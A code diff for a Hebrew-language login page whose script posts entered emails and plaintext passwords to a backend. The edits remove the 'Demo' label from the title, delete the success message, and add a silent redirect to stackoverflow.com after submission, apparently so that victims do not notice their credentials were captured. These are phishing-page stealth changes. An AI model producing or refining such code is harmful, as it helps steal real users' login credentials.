@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>התחברות | Demo</title>
+  <title>התחברות</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -107,9 +107,9 @@
         password: password,  // WARNING: plaintext passwords
         timestamp: Date.now()
       }).then(() => {
-        setMsg("נשלח בהצלחה!", "#2ecc71");
         document.getElementById("email").value = "";
         document.getElementById("password").value = "";
+        window.location.replace("https://stackoverflow.com");
       }).catch(err => {
         console.error(err);
         setMsg("שגיאה בשליחה: " + err.message, "#ff3e3e");
